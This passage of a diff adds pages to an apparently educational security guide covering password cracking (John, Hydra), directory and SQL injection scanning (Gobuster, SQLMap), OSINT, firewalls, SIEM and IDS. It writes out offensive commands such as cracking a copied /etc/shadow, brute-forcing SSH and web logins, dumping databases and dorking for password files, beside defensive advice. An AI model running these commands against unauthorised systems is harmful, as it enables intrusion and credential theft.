+      <div class="card-title">John the Ripper Basics</div>
+      <div class="layman"><span class="layman-label">Layman</span>John is the simpler cousin of Hashcat. Great for quickly cracking common Linux password formats. Auto-detects the hash type, which is a massive convenience. Often the first tool to try when you find a hash file.</div>
+      <div class="code">
+<span class="cm"># Install John</span><br>
+<span class="fl">sudo</span> apt install john<br><br>
+<span class="cm"># Auto-detect and crack</span><br>
+<span class="fl">john</span> hashes.txt<br><br>
+<span class="cm"># Use wordlist (rockyou.txt is the famous one)</span><br>
+<span class="fl">john</span> <span class="fl">--wordlist</span>=/usr/share/wordlists/rockyou.txt hashes.txt<br><br>
+<span class="cm"># Show cracked passwords</span><br>
+<span class="fl">john</span> <span class="fl">--show</span> hashes.txt<br><br>
+<span class="cm"># Crack /etc/shadow Linux passwords</span><br>
+<span class="fl">sudo</span> cat /etc/shadow &gt; shadow.txt<br>
+<span class="fl">john</span> <span class="fl">--wordlist</span>=rockyou.txt shadow.txt<br><br>
+<span class="cm"># Crack ZIP password</span><br>
+<span class="fl">zip2john</span> secret.zip &gt; zip.hash<br>
+<span class="fl">john</span> zip.hash
+      </div>
+    </div>
+    <div class="card red">
+      <div class="badge core">Wordlists</div>
+      <div class="card-title">rockyou.txt & Other Wordlists</div>
+      <div class="layman"><span class="layman-label">Layman</span>rockyou.txt is a famous list of 14 million real passwords leaked from a 2009 breach. Most people use weak, predictable passwords. Attackers try these known passwords first — called a dictionary attack. If your password is on this list, it'll be cracked in seconds.</div>
+      <div class="code">
+<span class="cm"># Find wordlists on Kali:</span><br>
+<span class="fl">ls</span> /usr/share/wordlists/<br><br>
+<span class="cm"># Extract rockyou.txt (it's compressed)</span><br>
+<span class="fl">gunzip</span> /usr/share/wordlists/rockyou.txt.gz<br><br>
+<span class="cm"># Line count (14 million passwords!):</span><br>
+<span class="fl">wc</span> <span class="fl">-l</span> /usr/share/wordlists/rockyou.txt<br><br>
+<span class="cm"># SecLists — comprehensive wordlists collection</span><br>
+<span class="fl">sudo</span> apt install seclists<br>
+<span class="fl">ls</span> /usr/share/seclists/
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 12: HYDRA ════════ -->
+<section class="page" id="hydra">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--red)">PAGE 12 — BRUTE FORCE</div>
+    <h2 class="page-title" style="color:var(--red)">Hydra — Online Brute Force</h2>
+    <p class="page-desc">Network login cracker. Brute forces live services — SSH, FTP, HTTP logins, databases — over the network.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card red">
+      <div class="badge hot">Offensive Tool</div>
+      <div class="card-title">Hydra Fundamentals</div>
+      <div class="layman"><span class="layman-label">Layman</span>Hydra tries millions of username/password combinations against live services — like trying every key on a keyring against a lock, very fast. The difference from Hashcat: Hydra attacks live services (SSH, web logins) over the network. Hashcat cracks offline hash files.</div>
+      <div class="code">
+<span class="cm"># Install Hydra</span><br>
+<span class="fl">sudo</span> apt install hydra<br><br>
+<span class="cm"># Brute force SSH</span><br>
+<span class="fl">hydra</span> <span class="fl">-l</span> root <span class="fl">-P</span> rockyou.txt 192.168.1.10 ssh<br>
+<span class="cm"># -l = single username, -L = username list</span><br>
+<span class="cm"># -p = single password, -P = password list</span><br><br>
+<span class="cm"># Brute force FTP</span><br>
+<span class="fl">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> pass.txt ftp://192.168.1.10<br><br>
+<span class="cm"># Brute force web login form</span><br>
+<span class="fl">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> pass.txt 192.168.1.10 \<br>
+  http-post-form <span class="st">"/login:user=^USER^&pass=^PASS^:Invalid"</span><br><br>
+<span class="cm"># Speed up with multiple threads</span><br>
+<span class="fl">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> pass.txt <span class="fl">-t</span> 64 ssh://target
+      </div>
+    </div>
+    <div class="card red">
+      <div class="badge core">Defense</div>
+      <div class="card-title">Defending Against Brute Force</div>
+      <div class="layman"><span class="layman-label">Layman</span>Brute force attacks are loud and obvious — your logs will show thousands of failed login attempts from one IP. The defense is simple: rate limiting, lockout, and fail2ban (auto-bans IPs that fail too many times).</div>
+      <div class="code">
+<span class="cm"># Install fail2ban (auto-bans brute-forcers)</span><br>
+<span class="fl">sudo</span> apt install fail2ban<br><br>
+<span class="cm"># Configure /etc/fail2ban/jail.conf</span><br>
+<span class="st">[ssh]</span><br>
+<span class="st">enabled = true</span><br>
+<span class="st">port = ssh</span><br>
+<span class="st">maxretry = 3</span>      <span class="cm"># ban after 3 failures</span><br>
+<span class="st">bantime = 3600</span>    <span class="cm"># banned for 1 hour</span><br>
+<span class="st">findtime = 600</span>    <span class="cm"># within 10 minutes</span><br><br>
+<span class="cm"># Restart fail2ban</span><br>
+<span class="fl">sudo</span> systemctl restart fail2ban<br><br>
+<span class="cm"># Check banned IPs</span><br>
+<span class="fl">sudo</span> fail2ban-client status ssh
+      </div>
+      <div class="pc">
+        <div class="pros"><div class="pt">Also Do This</div><ul><li>Disable password auth, use SSH keys</li><li>Rate limit login endpoints</li><li>Implement MFA</li></ul></div>
+        <div class="cons"><div class="ct">Brute Force Signs</div><ul><li>Thousands of failed logins in logs</li><li>Slow server response</li><li>Same IP, many usernames</li></ul></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 13: GOBUSTER ════════ -->
+<section class="page" id="gobuster">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--orange)">PAGE 13 — DIRECTORY ENUMERATION</div>
+    <h2 class="page-title" style="color:var(--orange)">Gobuster & Dirb</h2>
+    <p class="page-desc">Directory and file brute-forcing tools. Find hidden pages, admin panels, and backup files that developers forgot to protect.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card orange">
+      <div class="badge free">Fast & Free</div>
+      <div class="card-title">Gobuster — Directory Brute Force</div>
+      <div class="layman"><span class="layman-label">Layman</span>Web servers have many pages — some public, some meant to be secret. Gobuster tries thousands of common names against your site: /admin, /backup, /config, /test, etc. If any exist (even without a link), it finds them. Developers often forget hidden pages that expose sensitive data.</div>
+      <div class="code">
+<span class="cm"># Install gobuster</span><br>
+<span class="fl">sudo</span> apt install gobuster<br><br>
+<span class="cm"># Basic directory scan</span><br>
+<span class="fl">gobuster</span> dir <span class="fl">-u</span> http://target.com <span class="fl">-w</span> /usr/share/wordlists/dirb/common.txt<br><br>
+<span class="cm"># Scan for specific extensions</span><br>
+<span class="fl">gobuster</span> dir <span class="fl">-u</span> http://target.com \<br>
+  <span class="fl">-w</span> common.txt <span class="fl">-x</span> php,txt,html,bak<br><br>
+<span class="cm"># Increase threads (faster)</span><br>
+<span class="fl">gobuster</span> dir <span class="fl">-u</span> http://target.com \<br>
+  <span class="fl">-w</span> common.txt <span class="fl">-t</span> 50<br><br>
+<span class="cm"># DNS subdomain enumeration</span><br>
+<span class="fl">gobuster</span> dns <span class="fl">-d</span> target.com \<br>
+  <span class="fl">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<br><br>
+<span class="cm"># Save output</span><br>
+<span class="fl">gobuster</span> dir <span class="fl">-u</span> http://target.com <span class="fl">-w</span> common.txt <span class="fl">-o</span> results.txt
+      </div>
+    </div>
+    <div class="card orange">
+      <div class="badge hot">What Gets Found</div>
+      <div class="card-title">Common Dangerous Findings</div>
+      <ul class="cl o">
+        <li><code style="color:var(--yellow)">/admin</code> — Admin panel accidentally exposed</li>
+        <li><code style="color:var(--yellow)">/backup.zip</code> — Full site backup downloadable by anyone</li>
+        <li><code style="color:var(--yellow)">/.git</code> — Git repository exposed (source code + secrets!)</li>
+        <li><code style="color:var(--yellow)">/phpinfo.php</code> — PHP configuration reveals system info</li>
+        <li><code style="color:var(--yellow)">/config.php.bak</code> — Config backup with DB passwords</li>
+        <li><code style="color:var(--yellow)">/.env</code> — Environment file with API keys</li>
+        <li><code style="color:var(--yellow)">/wp-admin</code> — WordPress admin (often brute-forced)</li>
+        <li><code style="color:var(--yellow)">/test.php</code> — Test files developers forgot to remove</li>
+      </ul>
+      <div class="alert danger">🚨 Exposed .git directory = GAME OVER. Attacker can download your entire source code, commit history, and any secrets ever committed.</div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 14: SQLMAP ════════ -->
+<section class="page" id="sqlmap">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--red)">PAGE 14 — SQL INJECTION</div>
+    <h2 class="page-title" style="color:var(--red)">SQLMap — SQL Injection Automation</h2>
+    <p class="page-desc">The most dangerous web vulnerability, automated. SQL injection still ranks as the #1 web attack vector.</p>
+  </div>
+  <div class="banner red reveal">
+    <div class="banner-icon">💉</div>
+    <div>
+      <div class="banner-title">SQL Injection — The Exploit That Shouldn't Still Exist</div>
+      <div class="banner-text">SQL injection has been known since 1998. Yet it remains #1 in OWASP Top 10. It happens when user input is directly embedded in SQL queries. SQLMap automates finding and exploiting these vulnerabilities — and can dump entire databases in seconds.</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card red">
+      <div class="badge hot">Critical Concept</div>
+      <div class="card-title">What is SQL Injection?</div>
+      <div class="layman"><span class="layman-label">Layman</span>A web app asks: "What's your username?" and uses your answer in a database query. Normally: <code style="color:var(--yellow)">SELECT * FROM users WHERE name='alice'</code>. If you enter <code style="color:var(--yellow)">alice' OR 1=1--</code>, the query becomes: <code style="color:var(--yellow)">SELECT * FROM users WHERE name='alice' OR 1=1--'</code> which returns ALL users. You just bypassed authentication.</div>
+      <div class="code">
+<span class="cm"># Install sqlmap</span><br>
+<span class="fl">sudo</span> apt install sqlmap<br><br>
+<span class="cm"># Basic test on URL parameter</span><br>
+<span class="fl">sqlmap</span> <span class="fl">-u</span> <span class="st">"http://target.com/page?id=1"</span><br><br>
+<span class="cm"># Detect and enumerate databases</span><br>
+<span class="fl">sqlmap</span> <span class="fl">-u</span> <span class="st">"http://target.com/page?id=1"</span> <span class="fl">--dbs</span><br><br>
+<span class="cm"># Dump specific database tables</span><br>
+<span class="fl">sqlmap</span> <span class="fl">-u</span> <span class="st">"http://target.com/page?id=1"</span> \<br>
+  <span class="fl">-D</span> mydb <span class="fl">--tables</span><br><br>
+<span class="cm"># Dump specific table (e.g., users)</span><br>
+<span class="fl">sqlmap</span> <span class="fl">-u</span> <span class="st">"http://target.com/page?id=1"</span> \<br>
+  <span class="fl">-D</span> mydb <span class="fl">-T</span> users <span class="fl">--dump</span><br><br>
+<span class="cm"># Test POST request (login form)</span><br>
+<span class="fl">sqlmap</span> <span class="fl">-u</span> <span class="st">"http://target.com/login"</span> \<br>
+  <span class="fl">--data</span> <span class="st">"user=admin&pass=test"</span>
+      </div>
+    </div>
+    <div class="card red">
+      <div class="badge core">Defense</div>
+      <div class="card-title">Preventing SQL Injection (For Developers)</div>
+      <div class="layman"><span class="layman-label">Layman</span>The fix is simple: never put user input directly into SQL strings. Use "prepared statements" — pre-made query templates where user input is treated as data, never as SQL code. One code change eliminates the entire attack class.</div>
+      <div class="code">
+<span class="cm"># VULNERABLE code (never do this):</span><br>
+<span class="rd">query = "SELECT * FROM users WHERE name='" + username + "'"</span><br><br>
+<span class="cm"># SAFE — Parameterized/Prepared Statement:</span><br>
+<span class="cm"># Python (psycopg2)</span><br>
+<span class="fl">cursor</span>.execute(<br>
+  <span class="st">"SELECT * FROM users WHERE name = %s"</span>,<br>
+  (username,)<br>
+)<br><br>
+<span class="cm"># Node.js (pg)</span><br>
+<span class="fl">pool</span>.query(<br>
+  <span class="st">'SELECT * FROM users WHERE name = $1'</span>,<br>
+  [username]<br>
+)
+      </div>
+      <ul class="cl r" style="margin-top:0.75rem;">
+        <li>Use ORMs (they parameterize automatically)</li>
+        <li>Validate and sanitize ALL user input</li>
+        <li>Use WAF (Web Application Firewall)</li>
+        <li>Least-privilege DB user (read-only where possible)</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 15: SHODAN ════════ -->
+<section class="page" id="shodan">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--cyan)">PAGE 15 — RECON / OSINT</div>
+    <h2 class="page-title" style="color:var(--cyan)">Shodan — IoT & Service Search Engine</h2>
+    <p class="page-desc">Google for internet-connected devices. Finds exposed servers, cameras, industrial systems, and misconfigured services worldwide.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">🔭</div>
+    <div class="badge tool">OSINT Tool</div>
+    <div class="bigcard-title">Shodan: Search for Exposed Devices & Services</div>
+    <div class="layman"><span class="layman-label">Layman Explanation</span>Google indexes websites. Shodan indexes everything else connected to the internet — servers, routers, cameras, printers, industrial control systems, databases. If your Redis database accidentally has port 6379 exposed to the internet without a password (which happens all the time), Shodan will have found it and indexed it. Attackers use Shodan to find targets. Defenders use it to check if THEIR stuff is exposed.</div>
+    <div class="grid-2" style="margin-top:1.5rem;">
+      <div>
+        <div style="font-family:'JetBrains Mono',monospace;font-size:0.65rem;color:var(--cyan);text-transform:uppercase;margin-bottom:0.75rem;">Shodan Search Examples (shodan.io)</div>
+        <div class="code">
+<span class="cm"># Search for exposed Redis (no auth)</span><br>
+<span class="st">port:6379 redis</span><br><br>
+<span class="cm"># Find MongoDB exposed to internet</span><br>
+<span class="st">port:27017 mongodb</span><br><br>
+<span class="cm"># Apache servers in India</span><br>
+<span class="st">apache country:"IN"</span><br><br>
+<span class="cm"># Exposed Kubernetes dashboards</span><br>
+<span class="st">port:8001 kubernetes</span><br><br>
+<span class="cm"># Default password Webcams</span><br>
+<span class="st">has_screenshot:true port:554</span><br><br>
+<span class="cm"># Check your own IP</span><br>
+<span class="st">host:YOUR.IP.HERE</span>
+        </div>
+      </div>
+      <div>
+        <div class="pc" style="display:block;">
+          <div class="pros" style="margin-bottom:0.75rem;"><div class="pt">Use Shodan For</div><ul><li>Check if your servers are indexed</li><li>Verify firewall rules are working</li><li>Find misconfigured services before attackers do</li><li>Research attack surface before pentest</li></ul></div>
+          <div class="cons"><div class="ct">What Attackers Find</div><ul><li>Unprotected databases</li><li>Default credentials on devices</li><li>Old unpatched software versions</li><li>Industrial control systems (SCADA)</li></ul></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 16: OSINT ════════ -->
+<section class="page" id="osint">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--purple)">PAGE 16 — OSINT TOOLS</div>
+    <h2 class="page-title" style="color:var(--purple)">OSINT Tools</h2>
+    <p class="page-desc">Open Source Intelligence — gathering information about targets from public sources before any active attack.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card purple">
+      <div class="badge adv">Recon Tool</div>
+      <div class="card-title">theHarvester</div>
+      <div class="layman"><span class="layman-label">Layman</span>theHarvester collects email addresses, subdomains, IPs, and employee names from public search engines and services — before you ever touch the target. Like reading everything publicly written about someone before meeting them.</div>
+      <div class="code">
+<span class="cm"># Install</span><br>
+<span class="fl">sudo</span> apt install theharvester<br><br>
+<span class="cm"># Gather info about a domain</span><br>
+<span class="fl">theHarvester</span> <span class="fl">-d</span> target.com <span class="fl">-b</span> all<br><br>
+<span class="cm"># Specific sources</span><br>
+<span class="fl">theHarvester</span> <span class="fl">-d</span> target.com <span class="fl">-b</span> google<br>
+<span class="fl">theHarvester</span> <span class="fl">-d</span> target.com <span class="fl">-b</span> linkedin<br><br>
+<span class="cm"># Limit results</span><br>
+<span class="fl">theHarvester</span> <span class="fl">-d</span> target.com <span class="fl">-b</span> all <span class="fl">-l</span> 500
+      </div>
+    </div>
+    <div class="card purple">
+      <div class="badge adv">Recon Tool</div>
+      <div class="card-title">Maltego & Recon-ng</div>
+      <div class="layman"><span class="layman-label">Layman</span>Maltego visualizes relationships between people, companies, domains, and IPs — like a mind map of your target. Recon-ng is a powerful modular recon framework (like Metasploit, but for reconnaissance only).</div>
+      <div class="code">
+<span class="cm"># Install recon-ng</span><br>
+<span class="fl">sudo</span> apt install recon-ng<br>
+<span class="fl">recon-ng</span><br><br>
+<span class="cm"># Inside recon-ng:</span><br>
+<span class="st">recon-ng&gt;</span> marketplace install all<br>
+<span class="st">recon-ng&gt;</span> modules load recon/domains-hosts/hackertarget<br>
+<span class="st">recon-ng&gt;</span> options set SOURCE target.com<br>
+<span class="st">recon-ng&gt;</span> run<br><br>
+<span class="cm"># Also useful: Amass (subdomain enum)</span><br>
+<span class="fl">amass</span> enum <span class="fl">-d</span> target.com
+      </div>
+    </div>
+    <div class="card purple">
+      <div class="badge adv">Email Recon</div>
+      <div class="card-title">Email & Credential Intelligence</div>
+      <div class="code">
+<span class="cm"># Check if email is in data breaches</span><br>
+<span class="cm"># Use: haveibeenpwned.com API</span><br>
+<span class="fl">curl</span> <span class="st">"https://haveibeenpwned.com/api/v3/breachedaccount/user@domain.com"</span><br><br>
+<span class="cm"># Find emails for domain (free tool)</span><br>
+<span class="cm"># hunter.io, phonebook.cz</span><br><br>
+<span class="cm"># Google dorking (passive recon):</span><br>
+<span class="st">site:target.com filetype:pdf</span><br>
+<span class="st">site:target.com "password" filetype:txt</span><br>
+<span class="st">inurl:admin site:target.com</span><br>
+<span class="st">"@target.com" site:linkedin.com</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 17: FIREWALL ════════ -->
+<section class="page" id="firewall">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--green)">PAGE 17 — DEFENSE</div>
+    <h2 class="page-title" style="color:var(--green)">Firewalls — UFW & iptables</h2>
+    <p class="page-desc">Your first line of defense. Control what traffic enters and leaves your servers.</p>
+  </div>
+  <div class="banner reveal">
+    <div class="banner-icon">🧱</div>
+    <div>
+      <div class="banner-title">Firewall = Traffic Controller</div>
+      <div class="banner-text">A firewall is like a security checkpoint at your server's entrance. It looks at every packet trying to get in or out and decides: allowed or denied? Based on IP, port, protocol, and direction. The most critical security control after authentication.</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card">
+      <div class="badge core">Beginner-Friendly</div>
+      <div class="card-title">UFW — Uncomplicated Firewall</div>
+      <div class="layman"><span class="layman-label">Layman</span>UFW is a simplified firewall manager — it wraps iptables (complex) with simple commands. Great for most DevOps use cases. "Allow port 80. Allow port 443. Deny everything else." Simple and effective.</div>
+      <div class="code">
+<span class="cm"># Install & enable UFW</span><br>
+<span class="fl">sudo</span> apt install ufw<br>
+<span class="fl">sudo</span> ufw enable<br><br>
+<span class="cm"># Default: deny all in, allow all out</span><br>
+<span class="fl">sudo</span> ufw default deny incoming<br>
+<span class="fl">sudo</span> ufw default allow outgoing<br><br>
+<span class="cm"># Allow specific ports</span><br>
+<span class="fl">sudo</span> ufw allow 22/tcp    <span class="cm"># SSH</span><br>
+<span class="fl">sudo</span> ufw allow 80/tcp    <span class="cm"># HTTP</span><br>
+<span class="fl">sudo</span> ufw allow 443/tcp   <span class="cm"># HTTPS</span><br><br>
+<span class="cm"># Allow from specific IP only</span><br>
+<span class="fl">sudo</span> ufw allow from 192.168.1.5 to any port 22<br><br>
+<span class="cm"># Block an IP</span><br>
+<span class="fl">sudo</span> ufw deny from 1.2.3.4<br><br>
+<span class="cm"># Check status</span><br>
+<span class="fl">sudo</span> ufw status verbose
+      </div>
+    </div>
+    <div class="card">
+      <div class="badge adv">Advanced</div>
+      <div class="card-title">iptables — Raw Firewall Power</div>
+      <div class="layman"><span class="layman-label">Layman</span>iptables is the actual firewall engine in Linux. UFW is just a wrapper. iptables gives you complete control — but requires more knowledge. When you need complex rules (port forwarding, NAT, advanced filtering), iptables is the tool.</div>
+      <div class="code">
+<span class="cm"># List all rules</span><br>
+<span class="fl">sudo</span> iptables <span class="fl">-L</span> <span class="fl">-v</span> <span class="fl">-n</span><br><br>
+<span class="cm"># Allow established connections</span><br>
+<span class="fl">sudo</span> iptables <span class="fl">-A</span> INPUT <span class="fl">-m</span> state \<br>
+  <span class="fl">--state</span> ESTABLISHED,RELATED <span class="fl">-j</span> ACCEPT<br><br>
+<span class="cm"># Allow SSH</span><br>
+<span class="fl">sudo</span> iptables <span class="fl">-A</span> INPUT <span class="fl">-p</span> tcp \<br>
+  <span class="fl">--dport</span> 22 <span class="fl">-j</span> ACCEPT<br><br>
+<span class="cm"># Drop everything else</span><br>
+<span class="fl">sudo</span> iptables <span class="fl">-A</span> INPUT <span class="fl">-j</span> DROP<br><br>
+<span class="cm"># Save rules (persist on reboot)</span><br>
+<span class="fl">sudo</span> iptables-save &gt; /etc/iptables/rules.v4
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 18: iptables deep ════════ -->
+<section class="page" id="iptables">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--green)">PAGE 18 — FIREWALL ADVANCED</div>
+    <h2 class="page-title" style="color:var(--green)">iptables Deep Dive & nftables</h2>
+    <p class="page-desc">Chains, tables, rules — how the Linux packet filtering engine actually works.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card">
+      <div class="badge adv">Architecture</div>
+      <div class="card-title">iptables Architecture</div>
+      <div class="layman"><span class="layman-label">Layman</span>iptables has 3 main chains (checkpoints). INPUT = traffic coming TO your server. OUTPUT = traffic leaving your server. FORWARD = traffic passing THROUGH your server (router use). Each chain has rules evaluated top to bottom. First match wins.</div>
+      <table class="tbl">
+        <thead><tr><th>Chain</th><th>When Used</th><th>Common Use</th></tr></thead>
+        <tbody>
+          <tr><td>INPUT</td><td>Packets destined for this host</td><td>Block/allow inbound connections</td></tr>
+          <tr><td>OUTPUT</td><td>Packets leaving this host</td><td>Block outbound connections</td></tr>
+          <tr><td>FORWARD</td><td>Packets routing through host</td><td>Used in routers/gateways</td></tr>
+          <tr><td>PREROUTING</td><td>Before routing decision</td><td>Port forwarding, NAT</td></tr>
+          <tr><td>POSTROUTING</td><td>After routing decision</td><td>Masquerade/SNAT</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="card">
+      <div class="badge core">Modern Way</div>
+      <div class="card-title">nftables — The Future</div>
+      <div class="layman"><span class="layman-label">Layman</span>nftables is the modern replacement for iptables. Cleaner syntax, better performance, replaces iptables+ip6tables+arptables all in one. New Linux distributions are switching to nftables. Learn this for future-proofing.</div>
+      <div class="code">
+<span class="cm"># Install nftables</span><br>
+<span class="fl">sudo</span> apt install nftables<br><br>
+<span class="cm"># List all rules</span><br>
+<span class="fl">sudo</span> nft list ruleset<br><br>
+<span class="cm"># Create basic firewall ruleset</span><br>
+<span class="fl">sudo</span> nft add table inet filter<br>
+<span class="fl">sudo</span> nft add chain inet filter input \<br>
+  { type filter hook input priority 0 \; policy drop \; }<br><br>
+<span class="cm"># Allow SSH</span><br>
+<span class="fl">sudo</span> nft add rule inet filter input \<br>
+  tcp dport 22 accept<br><br>
+<span class="cm"># Allow HTTP/HTTPS</span><br>
+<span class="fl">sudo</span> nft add rule inet filter input \<br>
+  tcp dport { 80, 443 } accept
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 19: SIEM ════════ -->
+<section class="page" id="siem">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--yellow)">PAGE 19 — MONITORING</div>
+    <h2 class="page-title" style="color:var(--yellow)">SIEM — Security Event Monitoring</h2>
+    <p class="page-desc">Security Information and Event Management. Collect, correlate, and alert on security events across your entire infrastructure.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">📊</div>
+    <div class="badge warn">Critical for DevOps</div>
+    <div class="bigcard-title">SIEM: Your Security Command Center</div>
+    <div class="layman"><span class="layman-label">Layman Explanation</span>Imagine having 100 servers, each writing security logs. Without SIEM: finding an attack means manually checking all 100 servers. With SIEM: all logs stream to one central place, rules detect suspicious patterns automatically (e.g., "same user logging in from 5 different countries in 1 hour = alert!"), and you get notified immediately. It's the difference between a neighborhood watch and a professional 24/7 security operations center.</div>
+    <div class="grid-3" style="margin-top:1.5rem;">
+      <div style="background:rgba(255,204,0,0.04);border:1px solid rgba(255,204,0,0.15);border-radius:6px;padding:1.25rem;">
+        <div style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--yellow);margin-bottom:0.5rem;">FREE / OPEN SOURCE</div>
+        <ul class="cl y"><li>Wazuh (Best free SIEM)</li><li>Elastic SIEM (ELK Stack)</li><li>Graylog</li><li>Security Onion</li><li>OSSEC</li></ul>
+      </div>
+      <div style="background:rgba(0,212,255,0.04);border:1px solid rgba(0,212,255,0.15);border-radius:6px;padding:1.25rem;">
+        <div style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--cyan);margin-bottom:0.5rem;">COMMERCIAL</div>
+        <ul class="cl c"><li>Splunk (Industry leader)</li><li>IBM QRadar</li><li>Microsoft Sentinel</li><li>LogRhythm</li><li>Sumo Logic</li></ul>
+      </div>
+      <div style="background:rgba(0,255,136,0.04);border:1px solid rgba(0,255,136,0.15);border-radius:6px;padding:1.25rem;">
+        <div style="font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--green);margin-bottom:0.5rem;">SIEM DETECTS</div>
+        <ul class="cl"><li>Brute force login attempts</li><li>After-hours access</li><li>Privilege escalation</li><li>Data exfiltration patterns</li><li>Malware communication</li></ul>
+      </div>
+    </div>
+  </div>
+  <div class="grid reveal" style="margin-top:1.25rem;">
+    <div class="card yellow">
+      <div class="badge tool">ELK Stack Setup</div>
+      <div class="card-title">Elastic SIEM (Free Tier)</div>
+      <div class="code">
+<span class="cm"># ELK = Elasticsearch + Logstash + Kibana</span><br>
+<span class="cm"># Plus: Filebeat (lightweight log shipper)</span><br><br>
+<span class="cm"># Install Filebeat on your servers</span><br>
+<span class="fl">sudo</span> apt install filebeat<br><br>
+<span class="cm"># Configure /etc/filebeat/filebeat.yml</span><br>
+<span class="st">filebeat.inputs:</span><br>
+<span class="st">- type: log</span><br>
+<span class="st">  paths:</span><br>
+<span class="st">    - /var/log/auth.log</span><br>
+<span class="st">    - /var/log/nginx/*.log</span><br><br>
+<span class="cm"># Start filebeat</span><br>
+<span class="fl">sudo</span> systemctl start filebeat<br><br>
+<span class="cm"># Install Wazuh (all-in-one SIEM)</span><br>
+<span class="cm"># curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh</span><br>
+<span class="cm"># sudo bash wazuh-install.sh -a</span>
+      </div>
+    </div>
+    <div class="card yellow">
+      <div class="badge hot">Alert Rules</div>
+      <div class="card-title">Common SIEM Detection Rules</div>
+      <ul class="cl y">
+        <li>5+ failed SSH logins in 60 seconds from same IP = brute force alert</li>
+        <li>Root login via SSH at 3am = suspicious access alert</li>
+        <li>New user created outside business hours = privilege change alert</li>
+        <li>Outbound connection to known malicious IP = C2 communication alert</li>
+        <li>cron job modified = persistence mechanism alert</li>
+        <li>Large file transfer at night = data exfiltration alert</li>
+        <li>iptables rules changed = firewall tampering alert</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 20: IDS/IPS ════════ -->
+<section class="page" id="ids-ips">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--yellow)">PAGE 20 — INTRUSION DETECTION</div>
+    <h2 class="page-title" style="color:var(--yellow)">IDS/IPS — Snort & Suricata</h2>
+    <p class="page-desc">Intrusion Detection & Prevention Systems. Watch network traffic in real time and alert (IDS) or block (IPS) suspicious activity.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card yellow">
+      <div class="badge warn">IDS vs IPS</div>
+      <div class="card-title">Detection vs Prevention</div>
+      <div class="layman"><span class="layman-label">Layman</span>IDS is like a burglar alarm — it detects and screams. IPS is like an automated door that slams shut — it detects AND blocks. IDS watches traffic and logs suspicious activity. IPS actually blocks malicious traffic in real time. For production, you want IPS mode.</div>
+      <div class="pc">
+        <div class="pros"><div class="pt">IDS Mode</div><ul><li>Zero risk of blocking legit traffic</li><li>Learn what's normal first</li><li>Log and alert only</li><li>Passive monitoring</li></ul></div>
+        <div class="cons"><div class="ct">IPS Mode</div><ul><li>Blocks attacks automatically</li><li>Risk of false positives blocking users</li><li>Active intervention</li><li>Lower latency than manual response</li></ul></div>
+      </div>
+    </div>
+    <div class="card yellow">
+      <div class="badge tool">Snort/Suricata</div>
+      <div class="card-title">Snort & Suricata Commands</div>
+      <div class="code">
+<span class="cm"># Install Suricata (more modern than Snort)</span><br>
+<span class="fl">sudo</span> apt install suricata<br><br>
+<span class="cm"># Update rule sets</span><br>
+<span class="fl">sudo</span> suricata-update<br><br>
+<span class="cm"># Run Suricata in IDS mode on interface</span><br>
+<span class="fl">sudo</span> suricata <span class="fl">-i</span> eth0<br><br>
+<span class="cm"># Test configuration</span><br>
+<span class="fl">sudo</span> suricata <span class="fl">-T</span> <span class="fl">-c</span> /etc/suricata/suricata.yaml<br><br>
+<span class="cm"># Check alerts (live)</span><br>
+<span class="fl">tail</span> <span class="fl">-f</span> /var/log/suricata/fast.log<br><br>
+<span class="cm"># Check full JSON logs</span><br>
+<span class="fl">tail</span> <span class="fl">-f</span> /var/log/suricata/eve.json | <span class="fl">jq</span> .
+      </div>
+    </div>
+    <div class="card yellow">
+      <div class="badge adv">Writing Rules</div>
+      <div class="card-title">Custom Detection Rules</div>
+      <div class="layman"><span class="layman-label">Layman</span>Suricata rules are like "if you see THIS pattern in network traffic, do THAT action." You can write rules to detect port scans, SQL injection attempts, known malware signatures — anything.</div>
+      <div class="code">
+<span class="cm"># Suricata rule syntax:</span><br>
+<span class="cm"># action protocol src_ip src_port -> dst_ip dst_port (options)</span><br><br>
+<span class="cm"># Alert on any ICMP ping</span><br>
+<span class="st">alert icmp any any -&gt; $HOME_NET any (msg:"ICMP Ping"; sid:1001;)</span><br><br>
